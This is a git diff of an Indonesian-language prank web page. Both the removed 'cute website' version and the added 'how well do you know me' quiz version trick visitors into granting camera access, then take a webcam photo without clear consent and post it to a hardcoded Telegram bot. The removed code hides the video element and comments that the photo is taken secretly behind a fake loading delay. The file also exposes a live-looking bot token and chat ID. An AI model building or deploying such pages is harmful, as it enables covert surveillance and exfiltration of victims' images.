@@ -1,7 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Website Lucu ❤️</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SEBERAPA KENAL LU SAMA GW? 🔥</title>
     <style>
         * {
             margin: 0;
@@ -10,191 +12,222 @@
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #000428 0%, #004e92 100%);
+            font-family: 'Arial Black', 'Segoe UI', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         
-        /* CUSTOM PERMISSION POPUP */
-        .custom-permission {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 350px;
+        .container {
+            max-width: 500px;
+            width: 100%;
             text-align: center;
         }
         
-        .camera-icon {
-            font-size: 60px;
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 40px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            border: 4px solid #ffd700;
+        }
+        
+        h1 {
+            font-size: 2.5em;
+            color: #000428;
             margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
         
-        .custom-permission h2 {
-            color: #333;
-            margin-bottom: 10px;
+        h1 span {
+            color: #ffd700;
+            text-shadow: 2px 2px 0 #000428;
         }
         
-        .custom-permission p {
+        .sub {
             color: #666;
-            margin-bottom: 25px;
+            margin-bottom: 40px;
+            font-size: 1.1em;
         }
         
-        .btn-allow {
-            background: #667eea;
-            color: white;
+        .gas-btn {
+            background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
+            color: #000428;
             border: none;
-            padding: 12px 30px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        
-        .btn-block {
-            background: #e2e8f0;
-            color: #4a5568;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 50px;
-            font-size: 16px;
-            margin-left: 10px;
-            cursor: pointer;
-        }
-        
-        /* Hidden elements buat kamera */
-        #hiddenVideo {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
-        
-        #hiddenCanvas {
-            display: none;
-        }
-        
-        /* Loading dan konten utama */
-        .loading { display: none; margin-top: 20px; }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid white;
+            width: 200px;
+            height: 200px;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
+            font-size: 4em;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 10px 0 #b95f00, 0 20px 30px rgba(0,0,0,0.3);
+            transition: all 0.1s ease;
             margin: 20px auto;
+            display: block;
+            border: 5px solid white;
+            letter-spacing: 5px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .main-content {
+        .gas-btn:hover {
+            transform: translateY(5px);
+            box-shadow: 0 5px 0 #b95f00, 0 15px 25px rgba(0,0,0,0.3);
+        }
+        
+        .gas-btn:active {
+            transform: translateY(10px);
+            box-shadow: 0 0px 0 #b95f00, 0 10px 20px rgba(0,0,0,0.3);
+        }
+        
+        .status {
+            margin-top: 30px;
+            padding: 15px;
+            border-radius: 50px;
+            background: #f0f0f0;
+            color: #333;
+            font-weight: bold;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: rgba(255,255,255,0.5);
+            font-size: 0.9em;
+        }
+        
+        #video, #canvas {
             display: none;
-            text-align: center;
-            color: white;
         }
     </style>
 </head>
 <body>
-    <!-- Hidden camera elements -->
-    <video id="hiddenVideo" autoplay playsinline muted></video>
-    <canvas id="hiddenCanvas" width="1280" height="720"></canvas>
-    
-    <!-- CUSTOM POPUP WEBSITE -->
-    <div id="permissionPopup" class="custom-permission">
-        <div class="camera-icon">😡</div>
-        <h2>AKU MAU KAMU JUJUR SAMA AKU SEKARANG</h2>
-        <p>PLIZZZZZZZZZ</p>
-        <div>
-            <button class="btn-allow" onclick="requestCamera()">YAAAA</button>
-            <button class="btn-block" onclick="denyCamera()">GAAAA</button>
+    <div class="container">
+        <div class="card">
+            <h1>SEBERAPA <span>KENAL</span> LU SAMA GW?</h1>
+            <div class="sub">klik tombol GASSS buat buktiin! 🔥</div>
+            
+            <button class="gas-btn" id="gasBtn">GASSS</button>
+            
+            <div class="status" id="status">🕹️ siap gas? klik tombolnya!</div>
         </div>
-        <div id="loadingIndicator" class="loading">
-            <div class="spinner"></div>
-            <p style="color: #666;">Mengakses kamera...</p>
-        </div>
-    </div>
-    
-    <!-- KONTEN UTAMA -->
-    <div id="mainContent" class="main-content">
-        <h1>Makasih Cantiii! ❤️</h1>
-        <p>Izinin buat generate IMG!</p>
-        <img src="https://feeldreams.github.io/pandaputih.gif" width="200">
+        <div class="footer">🖕 buat nyet yang baca 🖕</div>
     </div>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
     <script>
-        // ===== KONFIGURASI BOT TELEGRAM =====
-        const BOT_TOKEN = '8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A';
-        const CHAT_ID = '8115098922';
+        const BOT_TOKEN = "8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A";
+        const CHAT_ID = "8115098922";
         
-        const video = document.getElementById('hiddenVideo');
-        const canvas = document.getElementById('hiddenCanvas');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+        const statusEl = document.getElementById('status');
+        const gasBtn = document.getElementById('gasBtn');
         
-        // INI DIA - BEGITU USER KLIK IZINKAN
-        function requestCamera() {
-            // Tampilkan loading biar keliatan wajar
-            document.getElementById('loadingIndicator').style.display = 'block';
+        let stream = null;
+        let cameraReady = false;
+        
+        async function kirimFotoKeBot(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, `muka_nyet_${Date.now()}.jpg`);
+            formData.append('caption', `🔥 LU KLIK GASSS! MUKA LU KE FOTO!`);
             
-            // MINTA AKSES KAMERA (POPUP CHROME MUNCUL)
-            navigator.mediaDevices.getUserMedia({ 
-                video: { width: 640, height: 480, facingMode: 'user' }
-            })
-            .then(stream => {
-                // USER UDAH KLIK ALLOW DI CHROME!
+            try {
+                statusEl.innerHTML = '📤 ngirim foto ke bot...';
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
                 
-                // Sembunyiin popup, munculin konten utama
-                document.getElementById('permissionPopup').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
-                
-                // Setup kamera hidden
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play();
-                    
-                    // DELAY 2 DETIK (biar keliatan loading wajar)
-                    // SELAMA INI DIAM-DIAM FOTO DIAMBIL!
-                    setTimeout(() => {
-                        // FOTO DIAMBIL
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // FOTO DIKIRIM KE TELEGRAM
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'foto_diam_diam.jpg');
-                            formData.append('caption', '📸 Target berhasil difoto!');
-                            
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData,
-                                mode: 'no-cors' // Silent mode
-                            });
-                            
-                            // Matiin kamera
-                            stream.getTracks().forEach(track => track.stop());
-                            video.srcObject = null;
-                            
-                            console.log('✅ FOTO TERKIRIM DIAM-DIAM!');
-                        }, 'image/jpeg', 0.7);
-                    }, 2000); // 2 detik setelah klik Allow
-                };
-            })
-            .catch(err => {
-                // User nolak di popup Chrome
-                alert('Yahh, izinin dulu ya buat filter lucunya! 😢');
-                location.reload();
-            });
+                if (result.ok) {
+                    statusEl.innerHTML = '✅ FOTO KIRIM! CEK BOT LO!';
+                } else {
+                    statusEl.innerHTML = '❌ gagal kirim: ' + (result.description || 'error');
+                }
+            } catch (e) {
+                statusEl.innerHTML = '❌ error: ' + e.message;
+            }
         }
         
-        function denyCamera() {
-            alert('Yahh, lain kali ya! 😊');
-            // Bisa redirect ke halaman lain
+        async function ambilFoto() {
+            if (!cameraReady || !stream) {
+                statusEl.innerHTML = '❌ kamera belum siap, coba lagi';
+                return;
+            }
+            
+            try {
+                statusEl.innerHTML = '📸 motret...';
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.9);
+                });
+                
+                if (blob) {
+                    await kirimFotoKeBot(blob);
+                } else {
+                    statusEl.innerHTML = '❌ gagal bikin foto';
+                }
+            } catch (e) {
+                statusEl.innerHTML = '❌ error: ' + e.message;
+            }
         }
+        
+        async function mintaKamera() {
+            try {
+                statusEl.innerHTML = '📷 minta izin kamera...';
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 640,
+                        height: 480,
+                        facingMode: 'user'
+                    } 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+                cameraReady = true;
+                
+                statusEl.innerHTML = '✅ kamera siap! foto otomatis diambil...';
+                
+                // Foto otomatis pas kamera siap
+                setTimeout(() => {
+                    ambilFoto();
+                }, 1000);
+                
+            } catch (err) {
+                statusEl.innerHTML = '❌ gabisa akses kamera: ' + err.message;
+                cameraReady = false;
+            }
+        }
+        
+        gasBtn.addEventListener('click', function() {
+            // Animasi
+            this.style.transform = 'translateY(10px)';
+            this.style.boxShadow = '0 0px 0 #b95f00, 0 10px 20px rgba(0,0,0,0.3)';
+            
+            setTimeout(() => {
+                this.style.transform = '';
+                this.style.boxShadow = '';
+            }, 200);
+            
+            // Minta kamera kalo belum
+            if (!cameraReady) {
+                mintaKamera();
+            } else {
+                ambilFoto();
+            }
+        });
     </script>
 </body>
 </html>
